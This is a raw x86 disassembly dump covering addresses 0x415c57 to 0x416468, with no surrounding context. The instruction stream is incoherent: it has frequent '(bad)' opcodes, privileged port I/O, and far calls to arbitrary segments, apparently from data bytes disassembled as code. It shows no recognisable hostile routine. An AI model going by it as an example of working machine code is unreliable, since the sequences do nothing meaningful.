  415c57:	call   DWORD PTR [ebp-0x7004152]
  415c5d:	mov    edx,0xbeccf71b
  415c62:	sar    ch,1
  415c64:	in     al,dx
  415c65:	add    BYTE PTR [edx-0x103c85dc],ah
  415c6b:	jno    0x415c68
  415c6d:	and    al,0x4f
  415c6f:	adc    DWORD PTR [edx+0x46bc0a3e],ecx
  415c75:	xor    ecx,DWORD PTR [esi]
  415c77:	cmp    al,0x1d
  415c79:	xor    bh,BYTE PTR [edx+edx*8+0x25528400]
  415c80:	mov    edi,0xae047c41
  415c85:	pop    ecx
  415c86:	addr16 dec edx
  415c88:	je     0x415c6b
  415c8a:	outs   dx,DWORD PTR ds:[esi]
  415c8b:	cmp    al,0xe9
  415c8d:	std    
  415c8e:	loope  0x415d0f
  415c90:	inc    edx
  415c91:	sar    BYTE PTR [ebp+0x3],1
  415c94:	add    ecx,edx
  415c96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c97:	mov    ss,WORD PTR [ebx]
  415c99:	iret   
  415c9a:	mov    al,ds:0xc35e98c6
  415c9f:	sub    BYTE PTR [ecx-0x23037e2c],cl
  415ca5:	sti    
  415ca6:	nop
  415ca7:	jmp    0xe17f:0x9ff718b4
  415cae:	test   al,0xa9
  415cb0:	adc    edi,eax
  415cb2:	add    eax,0x372953d1
  415cb7:	enter  0xff37,0x48
  415cbb:	push   0x13109788
  415cc0:	pop    ebp
  415cc1:	push   ss
  415cc2:	inc    ebx
  415cc3:	test   DWORD PTR [esi-0x39],edx
  415cc6:	mov    cl,0xaf
  415cc8:	mov    cl,0x14
  415cca:	and    eax,0x90725043
  415ccf:	call   0x2593:0x96e4ba0d
  415cd6:	repz jp 0x415cfd
  415cd9:	mov    ch,BYTE PTR [edi]
  415cdb:	out    0x14,al
  415cdd:	mov    cl,0xe
  415cdf:	aad    0x92
  415ce1:	(bad)  
  415ce2:	xchg   esi,eax
  415ce3:	(bad)  
  415ce5:	inc    edx
  415ce6:	ret    
  415ce7:	nop
  415ce8:	jle    0x415d40
  415cea:	sub    DWORD PTR [edi-0x64],ebp
  415ced:	mov    eax,0x3e018682
  415cf2:	mov    esp,0x7231815a
  415cf7:	sub    bl,bh
  415cf9:	jl     0x415d0a
  415cfb:	dec    esp
  415cfc:	pop    ebp
  415cfd:	jp     0x415cdf
  415cff:	push   edx
  415d00:	mov    dl,0xe4
  415d02:	ret    0xb76a
  415d05:	cli    
  415d06:	mov    ebx,0x7fd58354
  415d0b:	repnz lock sti 
  415d0e:	and    BYTE PTR [edi-0x4ac33b2b],0xea
  415d15:	fisub  WORD PTR [edx-0x3cf82c7b]
  415d1b:	add    ebp,DWORD PTR [ebx]
  415d1d:	fidivr DWORD PTR [edi+0x457a4ad7]
  415d23:	push   edx
  415d24:	xor    eax,DWORD PTR [ebp-0x29]
  415d27:	sbb    DWORD PTR [edi+0x7e7cb0ca],0xffffff8c
  415d2e:	add    edx,0x4b3cf220
  415d34:	push   0x6c
  415d36:	es in  al,0x74
  415d39:	mov    cl,0xbd
  415d3b:	test   BYTE PTR [edx+0x64e96043],bl
  415d41:	jb     0x415d83
  415d43:	mov    BYTE PTR [eax-0x1],dl
  415d46:	mov    al,ds:0x4f8992df
  415d4b:	ins    DWORD PTR es:[edi],dx
  415d4c:	pop    esp
  415d4d:	in     eax,0x31
  415d4f:	or     BYTE PTR [edi+0x71c98b3a],bh
  415d55:	xchg   edi,eax
  415d56:	ds dec edi
  415d58:	div    BYTE PTR [esi]
  415d5a:	sub    ah,0x53
  415d5d:	cwde   
  415d5e:	sub    eax,0x7be00c67
  415d63:	inc    eax
  415d64:	and    esi,ebp
  415d66:	arpl   WORD PTR [ebx-0x6016c954],sp
  415d6c:	test   eax,ebx
  415d6e:	and    bh,ah
  415d70:	xor    ecx,edx
  415d72:	in     al,dx
  415d73:	or     al,BYTE PTR [ecx-0x1491d628]
  415d79:	nop
  415d7a:	mov    edi,0x81775707
  415d7f:	mov    ds:0x50d4a7ed,al
  415d84:	mov    ebx,0xee939ac4
  415d89:	retf   0xcf73
  415d8c:	hlt    
  415d8d:	and    ebp,DWORD PTR [ebp-0x23]
  415d90:	push   ds
  415d91:	pop    es
  415d92:	outs   dx,DWORD PTR es:[esi]
  415d94:	call   0x27fcd5d6
  415d99:	shl    al,1
  415d9b:	lods   eax,DWORD PTR ds:[si]
  415d9d:	mov    dl,0x1e
  415d9f:	in     al,0x22
  415da1:	mov    eax,ds:0x4bb03427
  415da6:	test   al,0x96
  415da8:	or     eax,0x42
  415dab:	mov    al,0xb3
  415dad:	pop    ds
  415dae:	jns    0x415dda
  415db0:	xchg   esi,edx
  415db2:	loopne 0x415d79
  415db4:	std    
  415db5:	cli    
  415db6:	jns    0x415d5a
  415db8:	cmp    ah,BYTE PTR [edx]
  415dba:	imul   eax,DWORD PTR [ebx-0x6c266277],0x64
  415dc1:	mov    ebx,0x989bd3c3
  415dc6:	pusha  
  415dc7:	loope  0x415e0f
  415dc9:	pusha  
  415dca:	fadd   QWORD PTR [eax]
  415dcc:	pop    ebx
  415dcd:	or     BYTE PTR ds:0x7c7fddd8,0x36
  415dd4:	add    BYTE PTR [ebx],dl
  415dd6:	(bad)  
  415dd8:	xchg   edx,eax
  415dd9:	call   0xbc5b:0xad44ce00
  415de0:	xchg   ch,al
  415de2:	inc    esp
  415de3:	mov    DWORD PTR [eax],edi
  415de5:	das    
  415de6:	inc    eax
  415de7:	mov    bh,0xa7
  415de9:	lea    ebp,[ecx+ebx*2-0x79]
  415ded:	jmp    0x415e26
  415def:	or     dh,BYTE PTR [ecx-0x3a3247da]
  415df5:	xchg   esi,eax
  415df6:	mov    esp,0x23d77252
  415dfb:	sbb    eax,0x603251be
  415e00:	dec    esi
  415e02:	xchg   BYTE PTR ds:0xae546bbb,bl
  415e08:	mov    ch,0x9
  415e0a:	and    esp,DWORD PTR [eax+0x2e569338]
  415e10:	cmp    al,0xf6
  415e12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e13:	fcomp  QWORD PTR [edi+eax*1]
  415e16:	mov    eax,ds:0xb3558ca9
  415e1b:	outs   dx,DWORD PTR ds:[esi]
  415e1c:	mov    fs:0xd702b7dd,eax
  415e22:	jmp    0x415ddf
  415e24:	cli    
  415e25:	push   ss
  415e26:	je     0x415e92
  415e28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e29:	jbe    0x415e29
  415e2b:	js     0x415e76
  415e2d:	xchg   edi,eax
  415e2e:	dec    ebx
  415e2f:	(bad)  
  415e30:	jecxz  0x415ded
  415e32:	fldenv [edx+0x20d3281f]
  415e38:	or     al,0xc7
  415e3a:	loope  0x415dbf
  415e3c:	retf   
  415e3d:	dec    edx
  415e3e:	mov    BYTE PTR [eax-0x40],0x9
  415e42:	mov    bl,0x89
  415e44:	push   ss
  415e45:	test   eax,esi
  415e47:	sub    DWORD PTR [edx-0x3b],0xffffffa6
  415e4b:	jno    0x415e57
  415e4d:	sub    DWORD PTR [edx],esp
  415e4f:	es jmp 0x415e85
  415e52:	int    0xe
  415e54:	xchg   BYTE PTR [ecx-0xc89e1d],ah
  415e5a:	enter  0x12de,0xff
  415e5e:	or     ebp,DWORD PTR [edi-0x3a]
  415e61:	sbb    DWORD PTR [edi],ebx
  415e63:	and    DWORD PTR [eax],0xffffffe1
  415e66:	fs cmp eax,0x98e8092f
  415e6c:	jmp    0x43ad8b4a
  415e71:	and    edx,DWORD PTR [ebp-0x39]
  415e74:	icebp  
  415e75:	into   
  415e76:	dec    esi
  415e77:	inc    esp
  415e78:	jmp    0x415dfd
  415e7a:	sbb    eax,0xb91e326f
  415e7f:	pop    ss
  415e80:	hlt    
  415e81:	jl     0x415e73
  415e83:	cmp    bh,dh
  415e85:	and    DWORD PTR [eax],ecx
  415e87:	mov    esi,0xb254ceb2
  415e8c:	in     eax,dx
  415e8d:	adc    al,0x22
  415e8f:	jne    0x415ec4
  415e91:	movsx  ecx,ax
  415e94:	mov    ds:0xe9b91bb,al
  415e99:	jnp    0x415e27
  415e9b:	stc    
  415e9c:	inc    esp
  415e9d:	imul   esi,DWORD PTR [edx],0x7a
  415ea0:	cmp    DWORD PTR [ecx+edx*2],0x6a
  415ea4:	push   esp
  415ea5:	dec    ecx
  415ea6:	iret   
  415ea7:	daa    
  415ea8:	xchg   BYTE PTR [edi+0x5592ec6e],dl
  415eae:	enter  0xfd33,0x9d
  415eb2:	fist   DWORD PTR [eax+0x13]
  415eb5:	jb     0x415eaa
  415eb7:	mov    ebx,0x33bf169a
  415ebc:	lock xor ebx,DWORD PTR [esi]
  415ebf:	and    edx,eax
  415ec1:	adc    eax,eax
  415ec3:	in     eax,dx
  415ec4:	ret    0xe81a
  415ec7:	mov    esi,0x92ac2840
  415ecc:	jmp    0x415ed8
  415ece:	popf   
  415ecf:	pushf  
  415ed0:	jno    0x415f13
  415ed2:	popf   
  415ed3:	add    eax,0x8490c4b
  415ed8:	dec    ecx
  415ed9:	mov    bl,0xf3
  415edb:	xchg   eax,esi
  415edd:	fild   QWORD PTR [ebx+0x61a6fe0d]
  415ee3:	lahf   
  415ee4:	loop   0x415e88
  415ee6:	mov    edx,0x460628aa
  415eeb:	mov    al,ds:0xe5b3718f
  415ef0:	dec    ecx
  415ef1:	hlt    
  415ef2:	(bad)  
  415ef3:	sub    esi,DWORD PTR [ebp+0x63]
  415ef6:	out    0x93,eax
  415ef8:	adc    ebx,DWORD PTR ss:[di-0x5635]
  415efe:	cmp    bl,BYTE PTR [edi-0xa]
  415f01:	jmp    0x127473f0
  415f06:	je     0x415f6b
  415f08:	adc    ecx,DWORD PTR [esi]
  415f0a:	pop    edi
  415f0b:	cmp    dh,BYTE PTR ds:0x51af15a
  415f11:	rol    cl,0x7
  415f14:	add    eax,0x2ccec855
  415f19:	mov    ah,0x75
  415f1b:	jno    0x415ec7
  415f1d:	fsubr  DWORD PTR [edx]
  415f1f:	ret    0xe4ca
  415f22:	fisttp WORD PTR [ebp+0xb]
  415f25:	test   DWORD PTR [edi],0x6c6ba800
  415f2b:	inc    ebp
  415f2c:	inc    esp
  415f2d:	out    dx,al
  415f2e:	pop    esp
  415f2f:	movhps xmm3,QWORD PTR [edx+edx*8-0x4d0fbf4]
  415f37:	in     al,dx
  415f38:	pop    DWORD PTR [esi]
  415f3a:	sub    eax,0xefa0d1cb
  415f3f:	mov    edx,0x97e5cb68
  415f44:	and    DWORD PTR [edi],edi
  415f46:	test   eax,0x860f2ae6
  415f4b:	sub    DWORD PTR [edi+ecx*8-0x3921a851],ecx
  415f52:	or     DWORD PTR [edx+ecx*1],ecx
  415f55:	jle    0x415f62
  415f57:	arpl   WORD PTR [ebp-0x2a],si
  415f5a:	sub    DWORD PTR [edx+0x7bafed28],eax
  415f60:	or     BYTE PTR [ecx+0x69fa9503],al
  415f66:	cmp    bh,BYTE PTR [eax*2+0x48b0bae0]
  415f6d:	xor    edi,DWORD PTR [eax]
  415f6f:	mov    ds:0x9c7214fc,al
  415f74:	jne    0x415efb
  415f76:	call   FWORD PTR [bp+di]
  415f79:	mov    ecx,0xf418f938
  415f7e:	mov    DWORD PTR [eax+esi*1-0x4bd35f40],esp
  415f85:	fldcw  WORD PTR [edi+0x64c7179e]
  415f8b:	xchg   ebx,eax
  415f8c:	and    BYTE PTR [esi],dh
  415f8e:	pop    esp
  415f8f:	xchg   ebx,esi
  415f91:	sub    ch,ah
  415f93:	pusha  
  415f94:	mov    BYTE PTR [ecx-0x1],ch
  415f97:	sbb    BYTE PTR [ebp+0x2fd4fbb9],dh
  415f9d:	jb     0x415fcb
  415f9f:	ficom  DWORD PTR ds:0x3067b7d6
  415fa5:	sbb    al,0x7f
  415fa7:	mov    ds:0xe5f1181f,eax
  415fac:	(bad)  
  415fad:	sbb    edx,esi
  415faf:	sahf   
  415fb0:	stos   BYTE PTR es:[edi],al
  415fb1:	pop    esi
  415fb2:	mov    ecx,0x3914e52a
  415fb7:	xchg   ebx,ebx
  415fb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fba:	imul   ebp,DWORD PTR [edi],0xbc9aa33d
  415fc0:	test   eax,0xdfc257b8
  415fc5:	shr    BYTE PTR [ecx+0x45d03cab],1
  415fcb:	call   0x577b:0x29c2ad48
  415fd2:	hlt    
  415fd3:	push   cs
  415fd4:	scas   eax,DWORD PTR es:[edi]
  415fd5:	dec    eax
  415fd6:	xchg   edx,eax
  415fd7:	sub    al,0x85
  415fd9:	int3   
  415fda:	clc    
  415fdb:	in     al,dx
  415fdc:	dec    edx
  415fdd:	push   ss
  415fde:	pop    esi
  415fdf:	adc    dl,0x37
  415fe2:	fsub   QWORD PTR [edx+0x33]
  415fe5:	or     eax,0x3f4c470e
  415fea:	mov    ecx,0x75a74891
  415fef:	nop
  415ff0:	sub    dh,BYTE PTR [esi]
  415ff2:	push   edx
  415ff3:	out    0xeb,eax
  415ff5:	ja     0x416006
  415ff7:	pushf  
  415ff8:	dec    ecx
  415ff9:	leave  
  415ffa:	addr16 cli 
  415ffc:	dec    edi
  415ffd:	clc    
  415ffe:	fwait
  415fff:	les    ebx,FWORD PTR [edx]
  416001:	cmp    BYTE PTR ds:0x47bbd149,dh
  416007:	mov    eax,gs:0x47b732ce
  41600d:	xchg   edx,eax
  41600e:	pop    ecx
  41600f:	xor    al,0x32
  416011:	lock sbb eax,0xba38b3fc
  416017:	xor    al,0xc9
  416019:	in     al,0xa7
  41601b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41601c:	xor    BYTE PTR ss:[ecx],al
  41601f:	jecxz  0x415ff4
  416021:	mov    dh,0xfa
  416023:	xchg   esp,eax
  416024:	inc    ecx
  416025:	pop    ds
  416026:	daa    
  416027:	adc    eax,0xc3202115
  41602c:	sub    al,dh
  41602e:	repz mov dl,0xea
  416031:	mov    edx,0x8c5b7ef
  416036:	(bad)  
  416037:	sub    eax,0x29d45c16
  41603c:	mov    edx,0xc680377e
  416041:	mov    ch,0x93
  416043:	jae    0x416040
  416045:	(bad)  
  416046:	sbb    BYTE PTR [ebp+0x3a99ef92],bl
  41604c:	outs   dx,BYTE PTR ds:[esi]
  41604d:	dec    edx
  41604e:	jmp    DWORD PTR [edi]
  416050:	fnsave ss:[edi]
  416053:	(bad)  
  416054:	mov    edi,DWORD PTR [edx]
  416056:	ror    bh,0x1d
  416059:	fcomp  QWORD PTR [ebx]
  41605b:	icebp  
  41605c:	mov    esi,0x68eda4f8
  416061:	pop    ebx
  416062:	test   DWORD PTR [edx],0x5667b820
  416068:	loope  0x416098
  41606a:	das    
  41606b:	cld    
  41606c:	lea    esp,[ebx+0x5329c12d]
  416072:	ror    ebp,0xc4
  416075:	mov    bh,0x16
  416077:	mov    edx,0xcf4b6fbf
  41607c:	jbe    0x4160a4
  41607e:	xchg   esp,eax
  41607f:	fwait
  416080:	dec    esi
  416081:	je     0x416085
  416083:	dec    esp
  416084:	sbb    edi,esp
  416086:	mov    al,0x59
  416088:	(bad)  
  416089:	push   edi
  41608a:	inc    ecx
  41608b:	jbe    0x4160a4
  41608d:	push   esi
  41608e:	sbb    edi,esp
  416090:	mov    ah,0x61
  416092:	js     0x416085
  416094:	xchg   ebp,eax
  416095:	cwde   
  416096:	ret    0x2557
  416099:	pop    es
  41609a:	fadd   DWORD PTR [ebp+0x76ca8b0c]
  4160a0:	or     eax,DWORD PTR [edi-0x7897d984]
  4160a6:	dec    ecx
  4160a7:	lea    edx,[esi]
  4160a9:	nop
  4160aa:	xor    esp,esi
  4160ac:	push   0x3
  4160ae:	call   0x88af9d12
  4160b3:	ficom  WORD PTR [edx+0x774d505c]
  4160b9:	cmp    eax,0x4fe2136f
  4160be:	les    edi,FWORD PTR [esp+esi*2]
  4160c1:	adc    DWORD PTR [eax+0x50cf1185],ecx
  4160c7:	pop    es
  4160c8:	in     al,0x28
  4160ca:	dec    edi
  4160cb:	ret    
  4160cc:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4160ce:	jno    0x416061
  4160d0:	mov    dh,0x1a
  4160d2:	pop    ds
  4160d3:	je     0x41607e
  4160d5:	jle    0x416064
  4160d7:	or     bh,BYTE PTR ds:0xc9cdd6e0
  4160dd:	add    dh,BYTE PTR [eax]
  4160df:	fld    TBYTE PTR ss:[ebp+0x1e630420]
  4160e7:	add    eax,0x65611f67
  4160ec:	arpl   WORD PTR [edi],sp
  4160ee:	les    esi,FWORD PTR [ecx+0x9]
  4160f1:	cmp    al,0xaf
  4160f3:	xor    cl,BYTE PTR [ebx-0x20]
  4160f6:	sub    al,0xbe
  4160f8:	mov    al,ds:0xea7f4b41
  4160fd:	fstp   st(4)
  4160ff:	xor    DWORD PTR [ebp+0x13381d16],ebp
  416105:	mov    ah,0x56
  416107:	and    eax,esp
  416109:	mov    ss,WORD PTR [edx]
  41610b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41610c:	or     BYTE PTR [ecx+0x27565b6f],0x1f
  416113:	les    ebx,FWORD PTR [edi]
  416115:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416116:	jle    0x416171
  416118:	adc    BYTE PTR [edi+0x44ee63ed],0x6a
  41611f:	repnz iret 
  416121:	mov    DWORD PTR [edi-0x373ee66d],ebp
  416127:	in     eax,0xa
  416129:	fnstenv [edx-0x777e0bc8]
  41612f:	or     eax,0x9b0c354c
  416134:	fwait
  416135:	ror    BYTE PTR [edi-0x2fc40932],1
  41613b:	and    bh,bl
  41613d:	outs   dx,BYTE PTR ds:[esi]
  41613e:	jp     0x416138
  416140:	jmp    0xd4e2:0x9c3700ad
  416147:	adc    bh,BYTE PTR [edi+0x15]
  41614a:	and    eax,0xa14774a0
  41614f:	outs   dx,BYTE PTR ds:[esi]
  416150:	call   0xd981bc3c
  416155:	push   0xffffffae
  416157:	enter  0x7a79,0x26
  41615b:	fidivr DWORD PTR [ebx]
  41615d:	inc    ecx
  41615e:	clc    
  41615f:	inc    esp
  416160:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416161:	push   cs
  416162:	dec    edx
  416163:	push   cs
  416164:	(bad)  
  416165:	xor    al,0x5b
  416167:	mov    gs,edx
  416169:	hlt    
  41616a:	stos   DWORD PTR es:[edi],eax
  41616b:	cwde   
  41616c:	or     DWORD PTR [esi-0x7b],ebx
  41616f:	aaa    
  416170:	xchg   BYTE PTR [edi+0x565ac1f1],dl
  416176:	daa    
  416177:	jmp    0xc2e9a013
  41617c:	data16 in al,0xd2
  41617f:	cmp    bl,BYTE PTR [ebp+0x424a2a98]
  416185:	mov    ah,0x77
  416187:	jp     0x416151
  416189:	call   0x504aca9
  41618e:	xchg   DWORD PTR [edi+0x2c973685],esp
  416194:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416195:	cs xchg esp,eax
  416197:	out    0xf9,eax
  416199:	sub    ebx,esp
  41619b:	aas    
  41619c:	out    dx,al
  41619d:	dec    edi
  41619e:	fadd   st,st(4)
  4161a0:	xlat   BYTE PTR ds:[ebx]
  4161a1:	mov    ds:0xb61f4a14,al
  4161a6:	and    ch,bl
  4161a8:	lods   al,BYTE PTR ds:[esi]
  4161a9:	add    dh,BYTE PTR [edx]
  4161ab:	pop    ecx
  4161ac:	(bad)  
  4161ae:	push   es
  4161af:	and    dh,dl
  4161b1:	mov    ds,WORD PTR [ebx-0x496dc410]
  4161b7:	and    al,0x80
  4161b9:	inc    edx
  4161ba:	cdq    
  4161bb:	pop    edi
  4161bc:	loopne 0x416163
  4161be:	xchg   ecx,eax
  4161bf:	pushf  
  4161c0:	or     BYTE PTR ds:0x2bc6ca5e,dl
  4161c6:	fist   DWORD PTR [edx]
  4161c8:	fwait
  4161c9:	call   0x33a:0xcacf477b
  4161d0:	fild   QWORD PTR [ebx]
  4161d2:	dec    ecx
  4161d3:	cmp    eax,0x9bfeb1a
  4161d8:	mov    eax,ds:0x54d59e3f
  4161dd:	xor    eax,0xfbeec9cd
  4161e2:	push   esi
  4161e3:	adc    al,0x49
  4161e5:	(bad)  
  4161e7:	out    dx,eax
  4161e8:	(bad)  
  4161e9:	mov    dl,0xeb
  4161eb:	add    edi,esp
  4161ed:	sbb    ecx,DWORD PTR [eax+0x20]
  4161f0:	push   ebp
  4161f1:	pop    ds
  4161f2:	repz push 0xfffffff0
  4161f5:	mov    WORD PTR [edx-0x7c],?
  4161f8:	jge    0x4161bd
  4161fa:	mov    bh,0x86
  4161fc:	sub    eax,0x7ef718dc
  416201:	leave  
  416202:	mov    al,0x4
  416204:	mov    ds:0xb81c8b2d,al
  416209:	add    ebx,DWORD PTR [eax]
  41620b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41620c:	aaa    
  41620d:	aaa    
  41620e:	xor    BYTE PTR [edi+0x625bdc12],dl
  416214:	shl    DWORD PTR [esi],cl
  416216:	fadd   QWORD PTR [eax+0x5be99898]
  41621c:	fcomi  st,st(3)
  41621e:	dec    eax
  41621f:	xchg   ecx,eax
  416220:	mov    bh,0x0
  416222:	in     al,dx
  416223:	pop    ds
  416224:	enter  0x3289,0x55
  416228:	in     eax,0xf2
  41622a:	mov    ds:0x375f0bbf,al
  41622f:	fmul   DWORD PTR [edx+0x59]
  416232:	cmp    al,0x71
  416234:	xor    ebx,DWORD PTR [ecx-0x61]
  416237:	push   es
  416238:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416239:	(bad)  
  41623a:	out    0xb,eax
  41623c:	xor    edx,DWORD PTR [ebp+0x6f]
  41623f:	pop    eax
  416240:	outs   dx,DWORD PTR es:[esi]
  416242:	add    DWORD PTR [edi-0x76bb7271],ebx
  416248:	push   ds
  416249:	jecxz  0x416206
  41624b:	mov    ch,0x93
  41624d:	push   edi
  41624e:	mov    edi,0xf074d82b
  416253:	adc    ebp,DWORD PTR [edi-0x65]
  416256:	sti    
  416257:	aaa    
  416258:	les    ebp,FWORD PTR [ecx]
  41625a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41625b:	mov    al,0x41
  41625d:	mov    cl,0x2f
  41625f:	or     ecx,DWORD PTR gs:[ebp+ecx*8+0x37]
  416264:	adc    al,0xa0
  416266:	cmc    
  416267:	mov    al,0x7c
  416269:	fcmovb st,st(1)
  41626b:	sub    eax,0x6a84e4c
  416270:	aad    0xf5
  416272:	jg     0x4162a7
  416274:	enter  0xed87,0x8d
  416278:	ds jmp 0x4162f0
  41627b:	mov    al,dl
  41627d:	outs   dx,DWORD PTR ds:[esi]
  41627e:	ins    BYTE PTR es:[edi],dx
  41627f:	iret   
  416280:	jle    0x4162ef
  416282:	dec    esi
  416283:	call   0x66b9:0x7b0184c0
  41628a:	jle    0x4162e1
  41628c:	mov    edx,eax
  41628e:	into   
  41628f:	mov    eax,ds:0x6a760650
  416294:	mov    eax,ds:0x5744adf6
  416299:	shr    DWORD PTR [edi-0x7],0xf9
  41629d:	mov    ch,0x50
  41629f:	mov    ah,0xfd
  4162a1:	lahf   
  4162a2:	enter  0x421e,0xaf
  4162a6:	sub    ch,ch
  4162a8:	bound  ebx,QWORD PTR [edx-0x4b]
  4162ab:	jmp    0x416305
  4162ad:	sub    eax,0x1529dc9e
  4162b2:	jle    0x416319
  4162b4:	adc    eax,0x3aad7bec
  4162b9:	jecxz  0x41628f
  4162bb:	idiv   ch
  4162bd:	into   
  4162be:	xchg   BYTE PTR [edi+0x48],cl
  4162c1:	or     ebp,DWORD PTR [eax]
  4162c3:	rcr    BYTE PTR [edi],1
  4162c5:	sbb    eax,0xf235597a
  4162ca:	lods   al,BYTE PTR ds:[esi]
  4162cb:	out    dx,al
  4162cc:	pusha  
  4162cd:	cs jp  0x41626e
  4162d0:	or     dl,dh
  4162d2:	xchg   DWORD PTR [ebx],edx
  4162d4:	popf   
  4162d5:	cmp    ebx,esi
  4162d7:	xor    eax,edx
  4162d9:	mov    cs,WORD PTR [esi]
  4162db:	loopne 0x416312
  4162dd:	jp     0x416336
  4162df:	mov    al,0x1d
  4162e1:	sub    ah,BYTE PTR [eax]
  4162e3:	cmc    
  4162e4:	mov    bl,0x9b
  4162e6:	stc    
  4162e7:	xor    BYTE PTR [esi-0x78ae7864],dh
  4162ed:	dec    eax
  4162ee:	leave  
  4162ef:	cwde   
  4162f0:	mov    bh,bl
  4162f2:	and    ecx,eax
  4162f4:	sub    al,0x16
  4162f6:	ins    DWORD PTR es:[edi],dx
  4162f7:	repnz (bad) [eax+edi*4-0x48]
  4162fc:	sbb    eax,DWORD PTR [esi+0x7b]
  4162ff:	xchg   ecx,esi
  416301:	(bad)  
  416302:	xor    esp,DWORD PTR [ecx-0x12]
  416305:	sbb    DWORD PTR [eax-0x3270ba42],eax
  41630b:	mov    eax,0x1b7bb08e
  416310:	cli    
  416311:	cdq    
  416312:	mov    dh,0x43
  416314:	mov    edi,0x712bdd36
  416319:	in     al,dx
  41631a:	sti    
  41631b:	cld    
  41631c:	mov    esi,0x8aa700d3
  416321:	(bad)  
  416322:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416323:	xchg   ecx,eax
  416324:	mov    DWORD PTR [ebx-0x6b65482d],ecx
  41632a:	add    eax,DWORD PTR [ebx]
  41632c:	mov    ds:0x54ba5120,al
  416331:	lock fsub DWORD PTR [ebx]
  416334:	mov    bl,0x1a
  416336:	adc    bl,BYTE PTR [esi-0x39]
  416339:	aam    0xab
  41633b:	add    al,0x5f
  41633d:	add    eax,DWORD PTR [edi+0x2]
  416340:	js     0x41632e
  416342:	aaa    
  416343:	loopne 0x416372
  416345:	sub    dl,BYTE PTR [ebx+0x36]
  416348:	scas   eax,DWORD PTR es:[edi]
  416349:	xchg   esi,eax
  41634a:	mov    dh,0xd1
  41634c:	pop    eax
  41634d:	(bad)  
  41634e:	gs and al,0x85
  416351:	xchg   ebp,eax
  416352:	mov    dl,0xe4
  416354:	aam    0xe5
  416356:	push   edx
  416357:	movmskps ecx,xmm4
  41635a:	push   eax
  41635b:	push   ebx
  41635c:	push   ecx
  41635d:	and    BYTE PTR [edx-0x5a194802],ah
  416363:	jne    0x416345
  416365:	add    ah,BYTE PTR [ebx]
  416367:	or     al,0xe4
  416369:	xor    DWORD PTR ds:0xf75f256a,ebp
  41636f:	retf   
  416370:	sahf   
  416371:	sahf   
  416372:	lock push ecx
  416374:	pop    ecx
  416375:	or     BYTE PTR [edx+0x4],dl
  416378:	out    dx,eax
  416379:	pop    ds
  41637a:	sbb    al,0x95
  41637c:	lock or edx,esi
  41637f:	cmp    eax,0x291d33d1
  416384:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416385:	ds sar dl,cl
  416388:	mov    esi,0x311c8b50
  41638d:	push   edx
  41638e:	dec    esi
  41638f:	stos   DWORD PTR es:[edi],eax
  416390:	inc    DWORD PTR [ecx+0x4e]
  416393:	gs jge 0x4163d8
  416396:	push   cs
  416397:	inc    ebp
  416398:	push   ebx
  416399:	fdivr  st,st(2)
  41639b:	mov    ecx,0xcde32fce
  4163a0:	pop    ecx
  4163a1:	ss stc 
  4163a3:	push   ds
  4163a4:	pop    ss
  4163a5:	scas   eax,DWORD PTR es:[edi]
  4163a6:	pop    eax
  4163a7:	inc    BYTE PTR [edx-0xc]
  4163aa:	mov    ch,dh
  4163ac:	jne    0x4163d3
  4163ae:	inc    esp
  4163af:	mov    edx,0xf1a9b51e
  4163b4:	mov    cl,bl
  4163b6:	cmc    
  4163b7:	mov    ah,0x4b
  4163b9:	pop    gs
  4163bb:	adc    ah,BYTE PTR ds:0x9be8df36
  4163c1:	push   ebp
  4163c2:	mov    edx,0xaceaeadd
  4163c7:	fdivr  DWORD PTR [eax+0x72]
  4163ca:	dec    edi
  4163cb:	sahf   
  4163cc:	mov    dh,0x1b
  4163ce:	dec    esp
  4163cf:	push   edi
  4163d0:	out    dx,al
  4163d1:	sub    eax,0x5fb50921
  4163d6:	nop
  4163d7:	gs cwde 
  4163d9:	jbe    0x4163fd
  4163db:	test   DWORD PTR [ecx+0x6b30d98b],edi
  4163e1:	xor    DWORD PTR [esi+0x3b7d09b2],eax
  4163e7:	call   0x987a:0x6e3eaa44
  4163ee:	test   BYTE PTR [ebx+0x7],0x56
  4163f2:	ins    DWORD PTR es:[edi],dx
  4163f3:	jecxz  0x416375
  4163f5:	imul   DWORD PTR [edx*4+0x2a02b108]
  4163fc:	ret    
  4163fd:	lock jle 0x416393
  416400:	xor    dh,BYTE PTR [edi+0x40]
  416403:	dec    esp
  416404:	shl    ch,cl
  416406:	lds    edx,FWORD PTR [eax-0x66c99825]
  41640c:	data16 sbb BYTE PTR [edi+esi*2+0x6cdf9bc5],bl
  416414:	data16 or al,0x7f
  416417:	(bad)
  41641a:	xchg   edi,edi
  41641c:	xchg   edi,eax
  41641d:	(bad)  
  41641f:	cmc    
  416420:	cmp    al,0x19
  416422:	and    dh,BYTE PTR [edx+0x8b38944]
  416428:	push   es
  416429:	mov    eax,ds:0x63908f63
  41642e:	mov    al,ds:0x2143b733
  416433:	shl    ebp,1
  416435:	arpl   dx,cx
  416437:	jl     0x416432
  416439:	xor    ebp,0x206df69f
  41643f:	xchg   edi,eax
  416440:	and    al,0x76
  416442:	out    dx,eax
  416443:	sub    BYTE PTR [eax+0x5b06b93e],cl
  416449:	out    dx,eax
  41644a:	cmp    al,0x8c
  41644c:	ret    0xb6a3
  41644f:	xchg   esp,eax
  416450:	jmp    0xba92:0xf1a8e35b
  416457:	or     al,0xca
  416459:	mov    WORD PTR [ebp-0x2a],?
  41645c:	aas    
  41645d:	dec    eax
  41645e:	call   0xf4ba:0x9b038edb
  416465:	sar    BYTE PTR [edi],0x61
  416468:	cmp    esi,DWORD PTR [edi+eiz*1+0x7c]
